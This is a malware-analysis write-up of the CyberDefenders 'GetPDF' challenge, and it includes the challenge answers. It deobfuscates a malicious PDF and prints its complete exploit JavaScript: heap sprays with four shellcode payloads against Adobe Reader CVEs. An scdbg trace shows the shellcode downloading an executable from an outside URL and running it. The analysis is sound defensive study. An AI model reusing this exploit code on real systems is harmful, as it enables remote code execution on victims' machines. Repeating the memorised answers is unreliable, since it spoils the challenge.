
# GetPDF

## Wireshark part

## PDF part

```
Question #4 The MD5 hash of the file is 659cf4c6baa87b082227540047538c2a 
```

Parsing the PDF with peepdf.py failed since the pdf contains errors.

```
┌─[✗]─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $python2 /opt/pdf/peepdf/peepdf.py fcexploit.pdf
Error: An error has occurred while parsing an indirect object!!
```

Using the `-f` flag forces the file to ignore errors.

```
┌─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $python2 /opt/pdf/peepdf/peepdf.py -f fcexploit.pdf
Warning: PyV8 is not installed!!
Warning: pylibemu is not installed!!
Warning: Python Imaging Library (PIL) is not installed!!

File: fcexploit.pdf
MD5: 659cf4c6baa87b082227540047538c2a
SHA1: a93bf00077e761152d4ff8a695c423d14c9a66c9
SHA256: ba3c7c763f7910ef956e27be054e9271b00d05aab9fb153cdf30001ce422d68a
Size: 25169 bytes
Version: 1.3
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 18
Streams: 5
URIs: 0
Comments: 0
Errors: 2

Version 0:
	Catalog: 27
	Info: 11
	Objects (18): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 22, 23, 24, 25, 26, 27, 28]
		Errors (1): [11]
	Streams (5): [5, 7, 9, 10, 11]
		Encoded (4): [5, 7, 9, 10]
	Objects with JS code (1): [5]
	Suspicious elements:
		/AcroForm (1): [27]
		/OpenAction (1): [1]
		/XFA (1): [28]
		/JS (1): [4]
		/JavaScript (1): [4]
		getAnnots (CVE-2009-1492) (1): [5]
```

The output from the peepdf.py and pdf-parser.py both says 18 and thats is the wrong answer.

So i looked more in to the PDF file with peepdf.py, and focused on the error that we got earlier.

Using interactive mode `-i` and analysing the error in the object `11`, we can see that there seemes to be another strean object in that object. 

```
PDF> errors 11

Missing /Length in stream object (1)
```

```
PPDF> object 11

<< /ModDate D:20100910021118
/CreationDate D:20100910021118
/Producer Scribus PDF Library 1.3.3.14
/Creator Scribus 1.3.3.14
/Title 10 0 R
/Trapped /False
/Keywords 
/Author  >>
stream
x��[Y��8~��"ʼ'
Ә-,���L�)�5�K�I��F��_�v�r��+��H##}p���ر#|��_<W:�8�ߖ�Œ,aLǷ۲���֔��/ҷ�>1H,�'\j�{J�'|RDf��x�9����|˱���$I�
```

Running peepdf.py with the `-l` flag allows us to ignore the `endstream` tag and parse the stream anyway.

Now a new embeded file appears.

So there is in reality 19 objects in the PDF file.

```
Question #5 19 objects in the PDF file
```

To find out how many filtering methods the objects are using, a simple string command will provide us with that answer with the help of grep.

```
┌─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $strings fcexploit.pdf | grep Filter
	/Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
	/Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
	/Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
	/Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
```

```
Question #6 is 4 diffrent filtering methods are used
```

With peepdf.py in interactive mode we can get the javascript code that is located in the object 5 with `js_code 5`

```javascript
var SSS = null;
var SS = "ev";
var $S = "";
$5 = "in";
app.doc.syncAnnotScan();
S$ = "ti";
if (app.plugIns.length != 0) {
    var $$ = 0;
    S$ += "tl";
    $5 += "fo";
    ____SSS = app.doc.getAnnots({
        nPage: 0
    });
    S$ += "e";
    $S = this.info.title;
}
var S5 = "";
if (app.plugIns.length > 3) {
    SS += "a";
    var arr = $S.split(/U_155bf62c9aU_7917ab39/);
    for (var $ = 1; $ < arr.length; $++) {
        S5 += String.fromCharCode("0x" + arr[$]);
    }
    SS += "l";
}
if (app.plugIns.length >= 2) {
    app[SS](S5);
}
```

```
The answer of the question #7 is 5
```


We can see that $S refers to the "title" which i found out by making a quick grep
```
┌─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $strings fcexploit.pdf | grep -i title
/Title 10 0 R
```
Object 10 contains alot of obfuscated text (the whole text is not shown here)
```
PPDF> stream 10

U_155bf62c9aU_7917ab395fU_155bf62c9aU_7917ab395fU_155bf62c9aU_7917ab395fU_155bf62c9aU_7917ab395fU_155bf62c9aU_7917ab3953U_155bf62c9aU_7917ab3953U_155bf62c9aU...
```
We can se in the javascript that the object 10 is split on the text "U_155bf62c9aU_7917ab39"

I quickly created the same deobfuscation logic in python see [deobfuscation_stream_10.py](./scripts/deobfuscation_stream_10.py)

The deobfuscated code is:

```javascript
Download file
Open in new tab

____SS = 1;
____$5 = ____SSS[____SS].subject;
____$S = 0;
____$ = ____$5.replace(/X_17844743X_170987743/g, "%");
____S5 = ____SSS[____$S].subject;
____$ += ____S5.replace(/89af50d/g, "%");
____$ = ____$.replace(/\n/, "");
____$ = ____$.replace(/\r/, "");
____S$ = unescape(____$);
app.eval(____S$);
```
The deobfuscated code gets the annotation subject from the page 0 with the variable `____SSS` from the previous deobfuscated code. And then 

The first page which is located in object 3 has two annotations on it. Located in object `6` and object `8`.
```
┌─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $strings fcexploit.pdf | grep -i annots
3 0 obj << /Type /Page /MediaBox [ 0 0 612 792 ] /Annots [ 6 0 R 8 0 R ] /Parent 2 0 R >> endobj
```

The subject of the annotation are located in diffrent objects, `7` and `9` respectively (see example of the first annotation below). 

```
The answer of question #8 is 7,9
```

```
PPDF> object 6

<< /Rect [ 200 250 300 320 ]
/Type /Annot
/Name /Comment
/Subj 7 0 R
/Subtype /Text >>
```

The subject of the first annotation located in object 7 can be deobfuscated by replacing `89af50d` with `%`. The second stream in object 9 can be deobfuscated the same way by replacing the string and url-decoding it after.

```
┌─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $sed 's/89af50d/%/g' object7.blob
```

After adding the two pices of javascript code together we get the result below.

```javascript
var w = new String();
var c = app;

function s(yarsp, len) {
        while (yarsp.length * 2 < len) {
                yarsp += yarsp;
                this.x = false;
        }
        var eI = 37715;
        yarsp = yarsp.substring(0, len / 2);
        return yarsp;
        var yE = 18340;
}
var m = new String("");

function cG() {
            var chunk_size, payload, nopsled;
            
            chunk_size = 0x8000;
			// calc.exe payload
			payload = unescape("%uabba%ua906%u29f1%ud9c9%ud9c9%u2474%ub1f4%u5d64%uc583%u3104%u0f55%u5503%ue20f%ued5e%uabb9%uc1ea%u2d70%u1953%u3282%u6897%ud01d%u872d%ufd18%ua73a%u02dc%u14cc%u64ba%u66b5%uae41%uf16c%u5623%udb7c%u7bc1%u5e69%u69dd%uf0b0%ucf0c%u1950%udd95%u5ab9%u7b37%u772b%uc55f%u1531%ue18d%u70c8%uc2c5%u4c1c%u7b34%u2f3a%ue82b%u27c9%u848b%ua512%u999d%u2faa%u84c0%u2bee%u768c%u0bc8%u237e%u4cc6%u51c2%u3abc%ufc45%u1118%uffe5%uf48a%udf14%u6c2f%u8742%u0a57%u6fe9%ub5b5%uca94%ua6ab%u84ba%u77d1%u4a2c%u74ac%uabcf%ub25f%ub269%u5e06%u51d5%u90f3%u978f%uec66%u6942%u6a9b%u18a2%u12ff%u42ba%u7be5%ubb37%u9dc6%u5de0%ufe14%uf2f7%uc6fd%u7812%uda44%u7167%u110f%ubb01%uf81a%ud953%ufc21%u22db%u20f7%u46b9%u27e6%ue127%u8e42%udb91%ufe58%ubaeb%u6492%u07fe%uade3%u4998%uf89a%u9803%u5131%u1192%ufcd5%u3ac9%u352d%u71de%u81cb%u4522%u6d21%uecd2%ucb1c%u4e6d%u8df8%u6eeb%ubff8%u653d%ubaf6%u8766%ud10b%u926b%ubf19%u9f4a%u0a30%u8a92%u7727%u96a7%u6347%ud3b4%u824a%uc4ae%uf24c%uf5ff%ud99b%u0ae1%u7b99%u133d%u91ad%u2573%u96a6%u3b74%ub2a1%u3c73%ue92c%u468c%uea25%u5986%u9261%u71b5%u5164%u71b3%u561f%uabf7%u91c2%ua3e6%uab09%ub60f%ua23c%ub92f%ub74b%ua308%u3cdb%ua4dd%u9221%u2732%u8339%u892b%u34a9%ub0da%ua550%u4f47%u568c%uc8fa%uc5fe%u3983%u7a98%u2306%uf60a%uc88f%u9b8d%u6e27%u305d%u1edd%uadfa%ub232%u4265%u2d3a%uff17%u83f5%u87b2%u5b90");
			nopsled = unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090");
            while (nopsled.length < chunk_size)
                nopsled += nopsled;
            nopsled_len = chunk_size - (payload.length + 20);        
            nopsled = nopsled.substring(0, nopsled_len);
            heap_chunks = new Array();
            for (var i = 0 ; i < 2500 ; i++)
                heap_chunks[i] = nopsled + payload;
 

            util.printd("1.000000000.000000000.1337 : 3.13.37", new Date());
            try {
                media.newPlayer(null);
            } catch(e) {}
            util.printd("1.000000000.000000000.1337 : 3.13.37", new Date());
}
var iF = function() {};

function cN() {
        var o = "o";
		// freecell.exe payload
        var payload = unescape("%uc929%u65b1%ud7db%u74d9%uf424%u83b8%u3830%u5b84%u4331%u0313%u1343%u6883%udacc%u8571%u413d%u6a30%u13f7%ub07d%u5c06%uc249%ube91%u3948%ud6a4%u4246%ud958%uf0e9%ubf3e%ucb93%uf8bc%u520a%u60a7%ubd5e%u804d%ub8b6%ub75a%u5391%uf6b0%ub933%uea10%ubade%u91ba%ud64b%u1fdb%ub411%ub731%u92ab%uf842%u2a7a%ua0b8%uc819%uc7af%u9bee%u7d10%u4e2e%u4201%u8a96%ude7c%ud1cb%u20f0%ue235%uf4e3%u33a8%u6fbe%u8396%u15b9%ub97f%ud56a%u2c92%uf698%ud416%u50c7%u7361%u386d%u1a83%ue308%u7fb1%u7a3f%u20ac%u90a8%u2d99%u544b%u1868%ucced%u8012%u7b51%u7bef%u4d0b%u4095%u10c6%udea5%ue327%u47ed%u9d3e%u28f4%u51cb%ucfd7%u746c%u8c04%u286b%u95cd%u4396%u0b57%u58e2%ue11e%u508a%uab14%uf7cf%uab12%ufb47%u96c3%u9932%ud41d%u3bda%u7d77%uf214%ub242%u636f%u299d%u2962%u7be8%u7fe4%ub283%ub18f%uee39%u7b09%ub7de%ue345%u8c16%u2e59%u59c0%u6fa5%u263f%uda5e%u8219%ua5d1%u54fc%u0474%u75fc%u53b1%u7f0b%u599a%u9409%u48e7%uf318%u71c6%uc930%u6317%u3126%ua923%u2249%ua830%u4247%uad22%u3340%ude7b%u9f86%ue365%u8693%ufdba%u5594%u0f8f%u59bf%u0de8%u74d9%u16ff%ua327%u1cf0%ub333%u021a%uda1c%u2831%u2868%u583f%u1c0a%u720b%u6af0%u8a62%u64fe%u8883%u7ecc%u83ab%u823a%ufd8c%u0ead%u8e59%uc117%u0c8e%u7204%ufeb6%ue3bc%u9a56%u9545%u10c3%u0698%ube7e%ub5ca%u6f07%u2a75%u0a8a%uc717%ub603%u44b8%u59bc%ue62b%uf459%u93d4%u658e%u377a%u14a6%ua20e%ue517%u49c0%u6cd0%u419d");
		this.dN = "";
        var nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A");
        var hW = new String();
        var heapblock = nop + payload;
        this.qA = "qA";
        var bigblock = unescape("%u0A0A%u0A0A");
        this.alphaY = 12267;
        var headersize = 20;
        var spray = headersize + heapblock.length;
        var jZ = '';
        var jY = "";
        while (bigblock.length < spray) {
                this.r = "r";
                bigblock += bigblock; 
                var edit = "edit";
        }
        this.xGoogle = '';
        this.vY = false;
        var fillblock = bigblock.substring(0, spray);
        var iP = function() {};
        var block = bigblock.substring(0, bigblock.length - spray);
        var googleD = false;
        this.fUEdit = "";
        while (block.length + spray < 0x40000) {
                block = block + block + fillblock;
                this.bJ = '';
        }
        var googleQ = '';
        this.nW = '';
        var mem_array = new Array();  
        var cH = new String();
        var nVO = new String("");
        for (var i = 0; i < 1400; i++) {
                mem_array[i] = block + heapblock;
                var sQ = new String("");
        }
        var wC = '';
        var num = 12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888;
        this.bC = 3699;
        util.printf("%45000f", num);  
}
var eQ = "";

function gX() {
        var basicZ = '';
		// notepad.exe payload
        var shellcode = unescape("%uc931%u64b1%ub6bf%u558b%ud976%ud9cd%u2474%u58f4%ue883%u31fc%u0d78%u7803%ue20d%u6043%u2c45%u44e1%ub6af%u964c%ub72e%ued9a%u55a9%u1a18%u71cc%u2237%u7e30%u91b7%u1856%ue9ae%u2394%u7479%ucdff%u5e6b%ufc95%ue562%u12a2%u77ad%u53d8%u925f%u4178%ue5b2%ufc62%uf826%ub883%u9e2c%u6c59%uf5dd%u5d2a%uc113%uc7c1%ub031%u6cf7%ua2b6%u1838%u2007%u1d29%ua0b1%u0314%uaee1%ufbd8%u96df%ua80b%uc7cd%uca91%ubfab%u7091%uea13%u7a32%u7bb1%u5ba0%ue130%u3b9f%u8d42%ue4ba%u28a0%u4e20%u29d6%u0147%uf2cc%ucff0%uffb9%u2f62%uc948%u2904%ud333%ude69%u2b88%u10f3%u776b%uedee%uef80%u9fcf%u89c2%uc649%uf510%u36e3%u10fb%ud153%u40ef%u4d82%u41f6%ue4ae%u5cb1%uf58a%uaa78%u3472%u750f%u52e6%u712a%u9faf%u5fea%uc24a%u9cf3%u64f2%u0559%u5ecc%u7957%u0607%ue3a9%u828a%u26fc%uc2cc%u7f97%u1577%u2a0a%u9c21%u73c8%ube3e%u4838%uf571%u04de%uca4d%ue02c%u6126%u4c09%ucab8%u16cf%ueb5c%u3af3%uf869%u3ffd%u02b2%u2bfc%u17bf%u3214%u149e%u8f05%u0fff%uec38%u0df4%ue632%u5709%u0f5f%u481a%u6947%u7913%u5680%u864d%ufe94%u9652%uec98%ua8a6%u13b3%ub6c0%u39da%ub1c7%u1421%ub9d8%u6f32%udef2%u091c%uf4e9%ude69%ufd04%ud308%ud722%u1af7%u2f5a%u15f2%u2d5b%u2f31%u3e43%u2c3c%u26a4%ub9d6%u2921%u6d1c%uabe5%u1e0c%u059e%u8fa4%u3f0e%u3e4d%ucbaa%ud183%u5346%u40f5%ub4de%uf46f%uae52%u7901%u53fa%u1e82%uf294%u8d50%u9b01%u28cf%u50e5%ud262%ue195%u661d%u2003%ufeb8%ubcae");
		var mem_array = new Array();  
        this.googleBasicR = "";
        var cc = 0x0c0c0c0c;
        var addr = 0x400000;
        var sc_len = shellcode.length * 2;
        var len = addr - (sc_len + 0x38);
        var yarsp = unescape("%u9090%u9090");
        this.eS = "eS";
        yarsp = s(yarsp, len);
        var count2 = (cc - 0x400000) / addr;
        this.rF = false;
        this.p = "p";
        for (var count = 0; count < count2; count++) {
                mem_array[count] = yarsp + shellcode;
        }
        var bUpdate = new String(""); 
        var overflow = unescape("%u0c0c%u0c0c");
        var cP = function() {};
        this.gD = "";
        while (overflow.length < 44952) {
                this.tO = "";
                overflow += overflow; 
        }
        var adobeD = new String();
        this.collabStore = Collab.collectEmailInfo({
                subj: "",
                msg: overflow
        });
}
function updateE() {
        var xI = new String("");
        if (c.doc.Collab.getIcon) {   
                var arry = new Array();
				// cmd.exe payload
                var vvpethya = unescape("%ud3b8%u7458%ud901%u2bcb%ud9c9%u2474%ub1f4%u5a65%u4231%u0312%u1242%u3983%u96a4%u56f4%u0d45%u9bbd%ud7af%ue7f8%u982e%u1dcf%u7aa8%ucad5%u92cf%uf3c1%u9d2f%u4766%ufb49%u941e%uc494%u8389%uacfe%u6ad8%udd95%u0935%uf3a2%u801c%ub2d9%u488c%u2678%u0b5c%udd62%u01f4%u5b82%u4792%u4b5e%u2d2e%ubc2a%uf9ff%ue4c1%u9b9a%u83f7%ucc69%u3938%u1fb1%u7e29%uc50b%ue214%u8248%udcd8%ub3b7%u890b%ue425%uab91%u5210%u5192%uc8fc%u9932%u9def%ubaa1%u0795%u1c9f%uacee%uc5ba%u4b1c%uaf20%u0832%u3e47%u9129%uacf0%ude04%u1062%ue9e7%u0804%uf391%ubf69%ucc69%u71f0%u1108%uccee%u0d20%ubecf%ub462%ud949%u9971%u15e3%u3c5a%ub053%u5d89%u6c82%u6648%u07ae%u7ad2%u148a%ub09d%u1572%u1aab%u33e6%u5a91%ub8af%u4744%udd4a%u8b98%u47f2%u2af0%ub1cc%u03cf%u2707%ufe1e%ued8a%uca57%u23cd%u030e%u7277%u39bc%ubf21%u6423%udf3e%u5d93%uea71%u2a42%u2b4d%ud7b8%u0626%u7de4%ue9b8%ue771%uc85c%u0a82%u1f69%u2e8c%u1db2%u258c%u34bf%u2085%u359e%u98b7%u2cff%ue0a5%u6cf4%uf3c6%u7409%uf5ca%u6919%u60cd%u9a13%u4e19%ua74d%uf71c%ub952%uea11%ucba6%u0839%ud1c0%u2527%ud2c7%u10a5%ud8d8%u62bd%ufff2%u0b9a%uebe9%udfee%u1c04%ud389%u3622%u1d77%u4e5a%u177d%u4c5b%u21b3%u5f43%u31b9%u39a4%ubd2a%u4a21%u1291%uc8e5%u0389%u229e%ub43a%u5e0e%u24c3%ud4aa%ud71d%u7246%u4a4c%u53de%ufbf6%uc952%u7098%u72fa%u153a%u1594%ub5a8%ub801%u2057%u29e5%uc6f9%ud08e%u738b%u275f%u1e42%u22e7%u411a");
				var updateX = 39796;  
                var hWq500CN = vvpethya.length * 2;
                var len = 0x400000 - (hWq500CN + 0x38);
                var zAdobe = "";
                var yarsp = unescape("%u9090%u9090");
                var dU = "";
                yarsp = s(yarsp, len);
                this.zAdobeK = "";
                var p5AjK65f = (0x0c0c0c0c - 0x400000) / 0x400000;
                var aG = new Date();  
                for (var vqcQD96y = 0; vqcQD96y < p5AjK65f; vqcQD96y++) {
                        var lBasic = "";
                        arry[vqcQD96y] = yarsp + vvpethya;
                        var u = "";   
                }
                var iAlpha = function() {};
                var tUMhNbGw = unescape("%09");
                while (tUMhNbGw.length < 0x4000) {
                        this.gN = false;
                        tUMhNbGw += tUMhNbGw;
                }
                var hV = new String("");
                var nVE = function() {};
                tUMhNbGw = "N." + tUMhNbGw;
                c.doc.Collab.getIcon(tUMhNbGw);
        }
        this.wZ = 44811;
}
var hO = new String("");

function nO() {
        this.iR = false;
        var version = c.viewerVersion.toString();
        var zH = '';
        version = version.replace(/D/g, '');
        var varsion_array = new Array(version.charAt(0), version.charAt(1), version.charAt(2));
        if ((varsion_array[0] == 8) && (varsion_array[1] == 0) || (varsion_array[1] == 1 &&
varsion_array[2] < 3)) {
                cN();
        }
        this.wN = "";
        var aQ = new String("");
        if ((varsion_array[0] < 8) || (varsion_array[0] == 8 && varsion_array[1] < 2 && varsion_array[2] <
2)) {
                gX();
        }
        var vEdit = "";
        if ((varsion_array[0] < 9) || (varsion_array[0] == 9 && varsion_array[1] < 1)) {
                updateE();
        }
        var eH = function() {};
        var eSJ = new Function();
        cG();
        var vUpdate = false;
}
var basicU = new Date();
this.updateO = false;
nO();
var mUpdate = function() {};
```

The javascript code includes four shellcode payloads, that can be unescaped by the handy function in peepdf.py called `js_unescape`

```
PPDF> js_unescape string "%uabba%ua906%u29f1%ud9c9%ud9c9%u2474%ub1f4%u5d64%uc583%u3104%u0f55%u5503%ue20f%ued5e%uabb9%uc1ea%u2d70%u1953%u3282%u6897%ud01d%u872d%ufd18%ua73a%u02dc%u14cc%u64ba%u66b5%uae41%uf16c%u5623%udb7c%u7bc1%u5e69%u69dd%uf0b0%ucf0c%u1950%udd95%u5ab9%u7b37%u772b%uc55f%u1531%ue18d%u70c8%uc2c5%u4c1c%u7b34%u2f3a%ue82b%u27c9%u848b%ua512%u999d%u2faa%u84c0%u2bee%u768c%u0bc8%u237e%u4cc6%u51c2%u3abc%ufc45%u1118%uffe5%uf48a%udf14%u6c2f%u8742%u0a57%u6fe9%ub5b5%uca94%ua6ab%u84ba%u77d1%u4a2c%u74ac%uabcf%ub25f%ub269%u5e06%u51d5%u90f3%u978f%uec66%u6942%u6a9b%u18a2%u12ff%u42ba%u7be5%ubb37%u9dc6%u5de0%ufe14%uf2f7%uc6fd%u7812%uda44%u7167%u110f%ubb01%uf81a%ud953%ufc21%u22db%u20f7%u46b9%u27e6%ue127%u8e42%udb91%ufe58%ubaeb%u6492%u07fe%uade3%u4998%uf89a%u9803%u5131%u1192%ufcd5%u3ac9%u352d%u71de%u81cb%u4522%u6d21%uecd2%ucb1c%u4e6d%u8df8%u6eeb%ubff8%u653d%ubaf6%u8766%ud10b%u926b%ubf19%u9f4a%u0a30%u8a92%u7727%u96a7%u6347%ud3b4%u824a%uc4ae%uf24c%uf5ff%ud99b%u0ae1%u7b99%u133d%u91ad%u2573%u96a6%u3b74%ub2a1%u3c73%ue92c%u468c%uea25%u5986%u9261%u71b5%u5164%u71b3%u561f%uabf7%u91c2%ua3e6%uab09%ub60f%ua23c%ub92f%ub74b%ua308%u3cdb%ua4dd%u9221%u2732%u8339%u892b%u34a9%ub0da%ua550%u4f47%u568c%uc8fa%uc5fe%u3983%u7a98%u2306%uf60a%uc88f%u9b8d%u6e27%u305d%u1edd%uadfa%ub232%u4265%u2d3a%uff17%u83f5%u87b2%u5b90"

Unescaped bytes:

ba ab 06 a9 f1 29 c9 d9 c9 d9 74 24 f4 b1 64 5d   |.....)....t$..d]|
83 c5 04 31 55 0f 03 55 0f e2 5e ed b9 ab ea c1   |...1U..U..^.....|
70 2d 53 19 82 32 97 68 1d d0 2d 87 18 fd 3a a7   |p-S..2.h..-...:.|
dc 02 cc 14 ba 64 b5 66 41 ae 6c f1 23 56 7c db   |.....d.fA.l.#V|.|
c1 7b 69 5e dd 69 b0 f0 0c cf 50 19 95 dd b9 5a   |.{i^.i....P....Z|
37 7b 2b 77 5f c5 31 15 8d e1 c8 70 c5 c2 1c 4c   |7{+w_.1....p...L|
34 7b 3a 2f 2b e8 c9 27 8b 84 12 a5 9d 99 aa 2f   |4{:/+..'......./|
c0 84 ee 2b 8c 76 c8 0b 7e 23 c6 4c c2 51 bc 3a   |...+.v..~#.L.Q.:|
45 fc 18 11 e5 ff 8a f4 14 df 2f 6c 42 87 57 0a   |E........./lB.W.|
e9 6f b5 b5 94 ca ab a6 ba 84 d1 77 2c 4a ac 74   |.o.........w,J.t|
cf ab 5f b2 69 b2 06 5e d5 51 f3 90 8f 97 66 ec   |.._.i..^.Q....f.|
42 69 9b 6a a2 18 ff 12 ba 42 e5 7b 37 bb c6 9d   |Bi.j.....B.{7...|
e0 5d 14 fe f7 f2 fd c6 12 78 44 da 67 71 0f 11   |.].......xD.gq..|
01 bb 1a f8 53 d9 21 fc db 22 f7 20 b9 46 e6 27   |....S.!..". .F.'|
27 e1 42 8e 91 db 58 fe eb ba 92 64 fe 07 e3 ad   |'.B...X....d....|
98 49 9a f8 03 98 31 51 92 11 d5 fc c9 3a 2d 35   |.I....1Q.....:-5|
de 71 cb 81 22 45 21 6d d2 ec 1c cb 6d 4e f8 8d   |.q.."E!m....mN..|
eb 6e f8 bf 3d 65 f6 ba 66 87 0b d1 6b 92 19 bf   |.n..=e..f...k...|
4a 9f 30 0a 92 8a 27 77 a7 96 47 63 b4 d3 4a 82   |J.0...'w..Gc..J.|
ae c4 4c f2 ff f5 9b d9 e1 0a 99 7b 3d 13 ad 91   |..L........{=...|
73 25 a6 96 74 3b a1 b2 73 3c 2c e9 8c 46 25 ea   |s%..t;..s<,..F%.|
86 59 61 92 b5 71 64 51 b3 71 1f 56 f7 ab c2 91   |.Ya..qdQ.q.V....|
e6 a3 09 ab 0f b6 3c a2 2f b9 4b b7 08 a3 db 3c   |......<./.K....<|
dd a4 21 92 32 27 39 83 2b 89 a9 34 da b0 50 a5   |..!.2'9.+..4..P.|
47 4f 8c 56 fa c8 fe c5 83 39 98 7a 06 23 0a f6   |GO.V.....9.z.#..|
8f c8 8d 9b 27 6e 5d 30 dd 1e fa ad 32 b2 65 42   |....'n]0....2.eB|
3a 2d 17 ff f5 83 b2 87 90 5b                     |:-.......[|
```

```
C:\Users\cluless\Documents\cyberdefenders.org\getPDF\scdbg>scdbg.exe ..\first_sc
error setting working directory for drag and drop mode..exe=scdbg.exe
Loaded 1aa bytes from file ..\first_sc
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000

401104  GetProcAddress(GetSystemDirectoryA)
401104  GetProcAddress(WinExec)
401104  GetProcAddress(ExitThread)
401104  GetProcAddress(LoadLibraryA)
4010af  LoadLibraryA(urlmon)
401104  GetProcAddress(URLDownloadToFileA)
4010d3  GetSystemDirectoryA( c:\windows\system32\ )
4010ec  URLDownloadToFileA(http://blog.honeynet.org.my/forensic_challenge/malware1.exe, c:\WINDOWS\system32\a.exe)
4010f3  WinExec(c:\WINDOWS\system32\a.exe)
4010f7  ExitThread(32)

Stepcount 7787
```

This shellcode payload relies on a use-after-free vulnerability in `media.newPlayer()` in Adobe Acrobat and Reader [CVE-2009-4324](https://nvd.nist.gov/vuln/detail/CVE-2009-4324), to download a exe file from `http://blog.honeynet.org[.]my` to `c:\WINDOWS\system32\a.exe` and execute it.

The second payload shellcode payload uses a buffer overflow vulnerability in `util.printf()` in Adobe Acrobat and Reader [CVE-2008-2992](https://nvd.nist.gov/vuln/detail/CVE-2008-2992).

The third payload uses a buffer overflow vulnerability in the function `Collab.collectEmailInfo()`, affecting Adobe Acrobat and Reader [CVE-2007-5659](https://nvd.nist.gov/vuln/detail/CVE-2007-5659).

The fourth payload uses a buffer overflow vulnerability in the function `Collab.getIcon()`, affecting Adobe Acrobat and Reader [CVE-2009-0927](https://nvd.nist.gov/vuln/detail/CVE-2009-0927).

All shellcode payloads downloads an .exe file from `http://blog.honeynet.org[.]my` to `c:\WINDOWS\system32\a.exe` and executes it.

```
The answer to question #9 is that the files is downloaded to `c:\WINDOWS\system32\a.exe` 
```

The PDF uses 5 CVEs, these five and the CVE [CVE-2009-1492](https://nvd.nist.gov/vuln/detail/CVE-2009-1492) which allow the arbritrary code execution in the `object 5` in the PDF.

None of these files where downloaded to the host acording to the pcap, the only exe file that where donwloaded where from the URL `http://blog.honeynet.org[.]my/forensic_challenge/the_real_malware.exe` which also happend to be the answer to question 10

```
The answer to question #10 is that the URL of the dropped file is http://blog.honeynet.org[.]my/forensic_challenge/the_real_malware.exe
```

```
The answer to question #11 is that the PDF contains 5 CVEs 
```